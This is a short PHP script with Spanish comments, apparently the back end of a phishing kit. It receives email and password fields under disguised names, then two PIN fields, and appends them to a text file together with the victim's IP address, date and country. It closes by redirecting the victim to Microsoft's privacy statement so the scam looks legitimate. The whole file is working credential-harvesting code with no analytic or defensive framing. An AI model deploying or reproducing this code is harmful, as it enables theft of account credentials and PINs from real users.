<?php
// Desactivar la visualización de errores en producción
ini_set("display_errors", 0);

// Obtener la dirección IP del usuario
$user_ip = $_SERVER['REMOTE_ADDR'];

// Obtener el código de país basado en la dirección IP
$cc = trim(@file_get_contents("http://ipinfo.io/{$user_ip}/country"));

// Abrir el archivo en modo de escritura
$file = fopen("chivis.txt", "a");

// Verificar si se enviaron datos del primer formulario
if(isset($_POST['solapai']) && isset($_POST['segunpai'])) {
    // Escribir los datos en el archivo
    fwrite($file, "corre: ".$_POST['solapai']." - Clv: ".$_POST['segunpai']." - ");
    // Redireccionar al usuario a nodepin.html
    header('Location: nodepin.html');
    // Finalizar el script para evitar que se ejecute más código
    exit();
}

// Verificar si se enviaron datos del segundo formulario
if(isset($_POST['penelope']) && isset($_POST['paola'])) {
    // Escribir los datos en el archivo, incluyendo la fecha, hora, dirección IP y país
    fwrite($file, "pin: ".$_POST['penelope']."  pin2: ".$_POST['paola']."  ".date('Y-m-d')." - ".date('H:i:s')." ".$user_ip." ".$cc."  ". PHP_EOL);
    fwrite($file, "********************************* " . PHP_EOL);
    // Redireccionar al usuario a la página de privacidad de Microsoft
    header('Location: https://privacy.microsoft.com/es-mx/privacystatement');
    // Finalizar el script para evitar que se ejecute más código
    exit();
}

// Cerrar el archivo después de terminar de escribir datos
fclose($file);
?>